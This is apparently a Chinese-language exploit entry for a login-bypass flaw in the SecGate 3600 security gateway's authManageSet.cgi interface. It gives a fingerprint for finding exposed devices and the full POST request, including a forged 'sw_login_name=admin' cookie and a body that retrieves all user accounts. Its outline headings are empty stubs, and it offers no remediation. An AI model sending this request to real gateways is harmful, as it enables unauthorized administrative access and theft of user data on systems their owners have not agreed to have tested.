# 网神SecGata3600安全网关authManageSet.cgi接口登录绕过漏洞

- **系统**：网神SecGata3600安全网关authManageSet.cgi接口登录绕过　|　**类型**：其他　|　**CVE**：—
- **指纹**：`web.body="sec_gate_image/login_02.gif"`
- **请求**：`POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: sw_login_name=admin`

**请求体 / payload**
```
type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```

**其他**
- 网神SecGata 3600安全网关authManageSet.cgi 接口登录绕过漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***